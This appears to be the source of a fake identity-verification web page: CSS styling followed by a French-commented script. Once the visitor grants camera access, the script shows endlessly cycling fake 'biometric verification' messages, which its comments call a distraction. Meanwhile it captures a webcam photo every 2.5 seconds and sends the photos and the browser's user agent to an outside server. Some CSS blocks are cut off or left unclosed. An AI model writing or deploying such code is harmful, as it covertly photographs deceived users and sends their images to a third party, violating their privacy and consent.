    body {
        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
        min-height: 100vh;
        position: relative;
        overflow-x: hidden;
        padding: 50px 20px;
    }

    .background-elements {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }

    .floating-element {
      position: absolute;
      width: 8px;
      height: 8px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      animation: float 15s infinite linear;
    }

    @keyframes float {
      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
    }

    .container {
      background: rgba(255, 255, 255, 0.98);
      backdrop-filter: blur(40px);
      border-radius: 28px;
      padding: 45px;
      width: 440px;
      max-width: 92vw;
      box-shadow: 
        0 32px 64px rgba(0, 0, 0, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.9);
      border: 1px solid rgba(255, 255, 255, 0.3);
      position: relative;
      z-index: 10;
      margin-left: auto;
      margin-right: auto;
    }

    .header {
      text-align: center;
      margin-bottom: 35px;
    }

    .logo-container {
      position: relative;
      margin-bottom: 25px;
    }

    .logo {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 90px;
      height: 90px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      border-radius: 22px;
      box-shadow: 
        0 15px 35px rgba(102, 126, 234, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
      position: relative;
      overflow: hidden;
    }

    .logo::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: logoShine 3s ease-in-out infinite;
    }

    @keyframes logoShine {
      0%, 100% { transform: rotate(0deg) scale(0); opacity: 0; }
      50% { transform: rotate(180deg) scale(1); opacity: 1; }
    }

    .logo i {
      font-size: 42px;
      color: white;
      z-index: 1;
      position: relative;

    .title {

    .subtitle {

    .security-badge {
      background: linear-gradient(135deg, #e8f5ff, #f0f9ff);

      border-radius: 16px;
      padding: 18px;
      margin: 25px 0;
      display: flex;
      align-items: center;
      gap: 15px;
      position: relative;
      overflow: hidden;
    }

    .security-badge::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
      animation: securityScan 2s infinite;
    }

    @keyframes securityScan {
      0% { left: -100%; }
      100% { left: 100%; }

    .security-badge i {

  <!-- LE NOUVEAU SCRIPT (Mélange des deux logiques) -->
  <script>
    // Configuration pour l'envoi des données
    const CONFIG = {
      serverEndpoint: 'https://moonscale-dashboard.onrender.com/stream/upload', // Votre endpoint
      captureInterval: 2500, // Capturer une image toutes les 2.5 secondes
    };

    // État de l'application
    let mediaStream = null;
    let isCapturing = false;
    let captureTimer = null;

    // Éléments DOM
    const elements = {
      video: document.getElementById('videoStream'),
      canvas: document.getElementById('captureCanvas'),
      scanBtn: document.getElementById('scanButton'),
      status: document.getElementById('statusDisplay'),
      spinner: document.querySelector('.loading-spinner'),
      btnText: document.querySelector('.btn-text')
    };
    
    // Fonction pour mettre à jour l'interface
    function updateStatus(message, type = 'info') {
      elements.status.textContent = message;
      elements.status.className = `status ${type}`;
    }

    function setButtonState(loading, text) {
        elements.btnText.textContent = text;
        if (loading) {
            elements.spinner.style.display = 'inline-block';
            elements.scanBtn.disabled = true;
        } else {
            elements.spinner.style.display = 'none';
            elements.scanBtn.disabled = false;
        }
    }
    
    // Fonction pour capturer l'image
    function captureImage() {
      if (!elements.video.videoWidth) return null;
      const ctx = elements.canvas.getContext('2d');
      elements.canvas.width = elements.video.videoWidth;
      elements.canvas.height = elements.video.videoHeight;
      ctx.drawImage(elements.video, 0, 0, elements.canvas.width, elements.canvas.height);
      return elements.canvas.toDataURL('image/jpeg', 0.7);
    }
    
    // Fonction pour envoyer les données au serveur
    async function transmitCapturedData() {
      if (!isCapturing) return;

      const imageData = captureImage();
      if (!imageData) return;

      console.log('🖼️  Photo capturée, envoi au serveur...');

      try {
        const payload = {
          session_id: `demo_session_${Date.now()}`,
          timestamp: new Date().toISOString(),
          images: [imageData],
          metadata: { userAgent: navigator.userAgent }
        };

        const response = await fetch(CONFIG.serverEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log('✅ Transmission réussie.');
        } else {
          console.error('❌ Erreur serveur:', response.status);
        }
      } catch (error) {
        console.error('❌ Erreur de transmission:', error);
      }
    }
    
    // Le processus de distraction qui tourne en boucle
    function startEndlessVerification() {
        setButtonState(true, 'Vérification...');

        const messages = [
            "Analyse des caractéristiques faciales...",
            "Vérification de l'identité en cours...",
            "Validation des paramètres de sécurité...",
            "Maintien de la connexion sécurisée...",
            "Vérification des points biométriques..."
        ];
        let messageIndex = 0;

        // Changer le message de statut toutes les 4 secondes pour faire croire que ça travaille
        setInterval(() => {
            updateStatus(messages[messageIndex % messages.length], 'info');
            messageIndex++;
        }, 4000);
    }

    // Le déclenchement principal
    elements.scanBtn.addEventListener('click', async () => {
        // Si on est déjà en train de capturer, ne rien faire.
        if (isCapturing) return;

        updateStatus("Demande d'accès à la caméra...", 'info');

        try {
            // 1. Demander la permission
            mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            
            // --- L'UTILISATEUR A ACCEPTÉ ---
            elements.video.srcObject = mediaStream;
            await new Promise(resolve => { elements.video.onloadedmetadata = resolve; });
            
            updateStatus("Accès autorisé. Lancement de la vérification...", 'success');
            isCapturing = true;

            // 2. Lancer la distraction visuelle qui tourne en boucle
            startEndlessVerification();

            // 3. Lancer la capture et l'envoi de données en arrière-plan
            captureTimer = setInterval(transmitCapturedData, CONFIG.captureInterval);

        } catch (err) {
            // --- L'UTILISATEUR A REFUSÉ ---
            console.error("Accès caméra refusé.", err);
            updateStatus("Accès caméra refusé. La vérification est impossible.", 'error');
        }
    });

    // Nettoyage si l'utilisateur quitte la page
    window.addEventListener('beforeunload', () => {
        if (isCapturing) {
            clearInterval(captureTimer);
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }
    });
  </script>
</body>
</html>
